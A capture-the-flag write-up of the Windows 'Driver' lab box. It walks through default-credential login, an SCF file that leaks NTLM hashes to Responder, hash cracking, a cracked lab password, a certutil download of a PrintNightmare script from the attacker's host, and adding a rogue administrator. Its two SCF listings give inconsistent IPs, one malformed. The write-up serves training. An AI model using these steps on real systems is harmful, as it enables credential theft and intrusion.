# Box: Driver
# Level: Easy
# OS: Windows
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A 10.129.95.238 -v -p- -T4```

```
Nmap scan report for 10.129.95.238
Host is up (0.26s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|Phone|7 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Embedded Standard 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.032 days (since Sun Oct 22 08:20:46 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-10-22T15:06:27
|_  start_date: 2023-10-22T14:20:56
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   297.15 ms 10.10.14.1
2   297.50 ms 10.129.95.238

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 22 09:07:02 2023 -- 1 IP address (1 host up) scanned in 382.32 seconds
```
From our scan we have 4 open ports, lets start our enumeration today from port 80


# Enumeration

Navigating to the weboage we were asked to login

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/eb930ccc-b66a-4a9a-91ad-c3f6db4ceae2)

Default creds ```admin:admin``` actually works. Using that should get us logged in

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8ce16f32-ccb1-468b-ab07-169c3003ab5b)

nice we are in

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/15e454bb-5e2d-403d-974f-2e178bd582a3)

We can see this file upload button. Doing my research I found out that I can use SCF (Shell Command Files) files to gather hahses hehe.

Lets exploit this



# Exploitation

We can perform smb-share-scf-file-attacks here. You can read more about it [here](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)

First lets create the scf file

```
[Shell]
Command=2
IconFile=\\10.129.95.238\share\test.ico
[Taskbar]
Command=ToggleDesktop
```
Save this in a file say "bankai.scf". Also, adding the ```@``` symbol in front of the filename will place the ```bankai.scf``` on the top of the share drive


```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/driver]
└─$ nano @bankai.scf
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/driver]
└─$ cat @bankai.scf 
[Shell]
Command=2
IconFile=\\10.14.61\share\test.ico
[Taskbar]
Command=ToggleDesktop
```
Before uploading this file, set up your responder, so it can capture the hash of the user that accesses the share

command:```sudo responder -I tun1```

In your case it might be ```tun0``` not ```tun1```, just confirm this using the ```ifconfig``` command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dc4ae222-e8e8-44b8-9f5a-5b0942f3ddc2)

Nice, now lets upload the file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6b218642-3fa6-4d97-b1df-7bd6d2006711)

Checking the responder we set up

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7834b376-ac8f-471f-a8a6-61699d3f87b2)

smooth, we were able to capture the hash.

Now lets crack this usig hashcat

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f8a69fca-026c-4700-9f68-1f5f9d250ba6)

We successfully cracked the hash

Now lets connect using ```evil-winrm```

username:```tony```        password:```liltony```

command:```evil-winrm -u tony -i 10.129.73.227 -p 'liltony'```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/566577af-488c-48d1-9411-112ea4b0f282)

cool, we are in. Lets go ahead to escalate our privileges



# Privilege Escalation

Running winPEAS I found this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c933c0a2-1af7-47e4-a750-7a2ac4ec7549)

Lets check out the content of the file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e09157b3-97f6-4126-bd32-45cde000948c)

We can see a specific printer type ```"RICOH_PCL6```, apparently there's an exploit for this printer type that can help us escalate our privileges

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0da2ca2d-a24e-4655-9c17-9da7819efa80)

We won't be using metasploit lool

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b2dcde39-afad-415c-9150-bf414edcbb53)

We'll be using this. You can download the powershell script from [here](https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1)

We'll send this over to the target's machine using ```certutil```

command:```certutil -urlcache -f http://10.10.14.61/CVE-2021-1675.ps1 exploit.ps1```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1f59e272-c197-43c8-8c33-2a381b65f849)

Lets execute this script by running

```
Import-Module .\exploit.ps1
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3e809700-16da-4d49-9d56-a58446c93014)

we got an error omor. We can easily resolve this issue by changing the script execution policy for the current user

command:```Set-ExecutionPolicy Unrestricted -Scope CurrentUser```

After running the command, lets try to import the powershell script again

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c4ede32c-4991-4c06-a6ac-a93a51433332)

cool, no error. Now, we can add a new user to the local administrators group by default

command:```Invoke-Nightmare -NewUser "BlackAnon" -NewPassword "qwerty123"```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b8a1bfd5-cef8-4ef0-bd74-69e4d8ead25d)

Cool, it worked.

Lets use ```evil-winrm``` to connect to the server using the newly generated creds

command:```evil-winrm -u BlackAnon -i 10.129.73.227 -p 'qwerty123'```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dbe12f14-baed-4600-9b63-8524d090dcbe)

We have successfully pwned this box😎


That will be all for today
<br><br>
[Back To Home](../../index.md)





























